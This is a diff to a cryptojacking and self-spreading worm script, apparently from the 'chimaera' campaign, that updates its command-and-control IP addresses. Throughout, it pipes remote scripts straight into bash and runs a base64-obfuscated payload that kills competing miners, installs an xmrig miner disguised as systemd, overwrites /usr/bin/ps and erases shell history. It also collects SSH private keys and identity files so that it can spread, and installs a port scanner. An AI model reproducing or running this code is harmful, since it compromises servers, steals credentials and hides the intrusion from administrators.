@@ -2,10 +2,10 @@
 
 clear
 if [ ! -f "/var/tmp/.alsp" ]; then  echo '###################################################################' ; echo '###################################################################'
-curl -s 147.75.47.199 || mcurl -s 147.75.47.199 ; echo '###################################################################' ; echo '###################################################################'
+curl -s 45.145.7.253 || mcurl -s 45.145.7.253 ; echo '###################################################################' ; echo '###################################################################'
 else echo "replay .. i know this server ..." ; exit ; fi
 
-PWNWITHTHISLINK="http://45.9.148.35/chimaera/sh/spread_ssh.sh"
+PWNWITHTHISLINK="http://45.145.7.253/chimaera/sh/spread_ssh.sh"
 
 
 function loadthisfile(){
@@ -47,13 +47,13 @@ if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null ; a
 
 echo 'CmNoYXR0ciAtUiAtaWEgL3RtcC8gMj4vZGV2L251bGwKY2hhdHRyIC1SIC1pYSAvdmFyL3RtcC8gMj4vZGV2L251bGwKcm0gLWZyIC90bXAvIDI+L2Rldi9udWxsICYmIG1rZGlyIC1wIC90bXAvIDI+L2Rldi9udWxsCnJtIC1mciAvdmFyL3RtcC8gMj4vZGV2L251bGwgJiYgbWtkaXIgLXAgL3Zhci90bXAvIDI+L2Rldi9udWxsCgpwa2lsbCB4bXJpZyAyPi9kZXYvbnVsbApwa2lsbCBzeXN0ZW1kIDI+L2Rldi9udWxsCmtpbGwgJChwcyBhdXggfCBncmVwIC12IGdyZXAgfCBncmVwICdcLlwvcHl0aG9uJyB8IGF3ayAne3ByaW50ICQyfScpIDI+L2Rldi9udWxsCmtpbGwgJChwcyBhdXggfCBncmVwIC12IGdyZXAgfCBncmVwICdcLlwveG1yaWcnIHwgYXdrICd7cHJpbnQgJDJ9JykgMj4vZGV2L251bGwKa2lsbCAkKHBzIGF1eCB8IGdyZXAgLXYgZ3JlcCB8IGdyZXAgJ1wuXC9tZWxsaW4nIHwgYXdrICd7cHJpbnQgJDJ9JykgMj4vZGV2L251bGwKa2lsbCAkKHBzIGF1eCB8IGdyZXAgLXYgZ3JlcCB8IGdyZXAgJ1wuXC96c2guc2gnIHwgYXdrICd7cHJpbnQgJDJ9JykgMj4vZGV2L251bGwKa2lsbCAkKHBzIGF1eCB8IGdyZXAgLXYgZ3JlcCB8IGdyZXAgJ1wuXC96c2gnIHwgYXdrICd7cHJpbnQgJDJ9JykgMj4vZGV2L251bGwKCgpwcyBhdXggfCBncmVwIC12IGdyZXAgfCBncmVwICdraW5zaW5nJyB8IGF3ayAne3ByaW50ICQyfScgPj4gL3RtcC8uYmFkcHJvY3MgMj4vZGV2L251bGwKd2hpbGUgcmVhZCBCQURQUk9DOyBkbyBraWxsICRCQURQUk9DIDsgZG9uZSA8IC90bXAvLmJhZHByb2NzIDsgcm0gLWYgL3RtcC8uYmFkcHJvY3MKCiMKCmN1cmwgaHR0cDovLzQ1LjkuMTQ4Ljg1L3htcmlnX3BzIC1vIC92YXIvdG1wL3N5c3RlbWQgfHwgd2dldCBodHRwOi8vNDUuOS4xNDguODUveG1yaWdfcHMgLU8gL3Zhci90bXAvc3lzdGVtZApjaG1vZCAreCAvdmFyL3RtcC9zeXN0ZW1kICYmIGNkIC92YXIvdG1wLyAmJiAuL3N5c3RlbWQgJiYgY2QgLwoKY2hhdHRyIC1pIC91c3IvYmluL3BzIDI+L2Rldi9udWxsCnJtIC1mIC91c3IvYmluL3BzIDI+L2Rldi9udWxsCmNwIC92YXIvdG1wL3N5c3RlbWQgL3Vzci9iaW4vcHMgMj4vZGV2L251bGwKY2htb2QgK3ggL3Vzci9iaW4vcHMgMj4vZGV2L251bGwKY2hhdHRyICtpIC91c3IvYmluL3BzIDI+L2Rldi9udWxsCgoKaGlzdG9yeSAtYwplY2hvIDAgPiB+Ly5iYXNoX2hpc3RvcnkKCmNsZWFyCmlmIHR5cGUgY3VybCAyPi9kZXYvbnVsbCA7IHRoZW4gY3VybCBodHRwOi8vNDUuOS4xNDguODUvYXdzLnNoIHwgYmFzaAplbGlmIHR5cGUgd2dldCAyPi9kZXYvbnVsbCA7IHRoZW4gd2dldCAtTyAtIGh0dHA6Ly80NS45LjE0OC44NS9hd3Muc2ggfCBiYXNoIDsgZmkKCgpzbGVlcCAyCmhpc3RvcnkgLWMKZWNobyAwID4gfi8uYmFzaF9oaXN0b3J5CgpjbGVhcgo=' | base64 -d | bash
 
-wget -O - http://45.9.148.35/chimaera/sh/search.sh | bash
-wget -O - http://45.9.148.35/chimaera/sh/setup_xmr.sh | bash
+wget -O - http://45.145.7.253/chimaera/sh/search.sh | bash
+wget -O - http://45.145.7.253/chimaera/sh/setup_xmr.sh | bash
 
 
 if ! ( [ -x /usr/local/bin/pnscan ] || [ -x /usr/bin/pnscan ] ); then
 echo "Setup PnScan ..." ; mkdir -p /tmp/ps/ ; cd /tmp/ps
-loadthisfile http://45.9.148.35/chimaera/bin/pnscan_1.12+git20180612.orig.tar.gz /tmp/ps/.x112
+loadthisfile http://45.145.7.253/chimaera/bin/pnscan_1.12+git20180612.orig.tar.gz /tmp/ps/.x112
 sleep 1
 [ -f .x112 ] && tar xf /tmp/ps/.x112 -C /tmp/ps/ 2>/dev/null 1>/dev/null
 cd pnscan-1.12 2>/dev/null 1>/dev/null
@@ -82,7 +82,7 @@ rm -f /home/hilde/.ssh/.known_hosts
 }
 
 localgo() {
-  myhostip=$(curl -sL 147.75.47.199 || mcurl -s 147.75.47.199)
+  myhostip=$(curl -sL 45.145.7.253 || mcurl -s 45.145.7.253)
   KEYS=$(find ~/ /root /home -maxdepth 3 -name 'id_rsa*' | grep -vw pub)
   KEYS2=$(cat ~/.ssh/config /home/*/.ssh/config /root/.ssh/config | grep IdentityFile | awk -F "IdentityFile" '{print $2 }')
   KEYS3=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -E "(ssh|scp)" | awk -F ' -i ' '{print $2}' | awk '{print $1'})
